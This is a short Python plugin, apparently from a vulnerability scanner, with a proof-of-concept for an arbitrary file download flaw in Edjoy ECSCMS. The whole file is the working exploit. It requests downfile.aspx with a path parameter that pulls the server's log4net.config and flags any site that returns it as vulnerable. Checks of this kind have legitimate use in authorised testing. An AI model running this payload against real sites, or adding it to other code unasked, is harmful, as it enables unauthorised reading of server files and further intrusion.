#!/usr/bin/env python
#coding:utf8

__author__ = 'xiaokong'

from module.plugin import Plugin
import re

class poc(Plugin):

    type = 'CMS'
    cmsname = 'edjoy'
    querytype = 'site'
    description = 'Edjoy ECSCMS downfile.aspx download file'
    
    def __init__(self):
    
        self.payload = "/operationManage/downfile.aspx?name=test&path=log4net.config"
    
    def exploit(self, target):

        response = self.query(method='POST', url=target+self.payload)
        if response is not None:
            if response.ok:
                if '<log4net>' in response.content and '<?xml version="1.0" encoding="utf-8" ?>' in response.content:
                    self.log.vuln(target)
                
    

   



